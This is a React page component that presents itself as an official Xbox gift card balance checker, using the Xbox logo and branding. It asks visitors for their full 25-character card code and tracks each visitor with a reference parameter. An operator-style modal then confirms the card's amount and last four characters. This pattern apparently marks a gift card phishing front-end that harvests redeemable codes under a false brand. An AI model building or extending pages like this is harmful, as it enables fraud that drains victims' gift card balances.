import { useParams } from 'react-router-dom';
import { useSubmissionViewModel } from '../../viewmodels/useSubmissionViewModel';
import ClientConfirmModal from './components/ClientConfirmModal';
import ResultBanner from './components/ResultBanner';
import XboxSubmissionForm from './components/XboxSubmissionForm';
import styles from './XboxSubmissionPage.module.css';

export default function XboxSubmissionPage() {
  const { ref = '' } = useParams();
  const vm = useSubmissionViewModel(ref, 25, 5, 'xbox');

  return (
    <div className={styles.page}>
      <header className={styles.header}>
        <div className={styles.brand}>
          <img src="/xbox-logo-mark.png" alt="Xbox" className={styles.logo} />
          <span>Xbox</span>
        </div>
        <span className={styles.headerLabel}>Gift Cards</span>
      </header>

      <main className={styles.content}>
        <p className={styles.eyebrow}>XBOX GIFT CARDS</p>
        <h1 className={styles.title}>Check your Xbox Gift Card balance</h1>
        <p className={styles.description}>
          Enter your 25-character code to check its balance.
        </p>
        <XboxSubmissionForm
          code={vm.code}
          setCode={vm.setCode}
          isValid={vm.isValid}
          loading={vm.result === 'loading'}
          onSubmit={vm.submit}
        />
        <ResultBanner
          result={vm.result}
          amount={typeof vm.confirmedAmount === 'number' ? vm.confirmedAmount : undefined}
          theme="xbox"
        />
      </main>

      <footer className={styles.footer}>Xbox Gift Cards</footer>
      <ClientConfirmModal
        open={vm.result === 'confirmed'}
        amount={typeof vm.confirmedAmount === 'number' ? vm.confirmedAmount : undefined}
        last4={vm.last4}
        onClose={vm.reset}
        brandName="Xbox"
        showImage={false}
      />
    </div>
  );
}
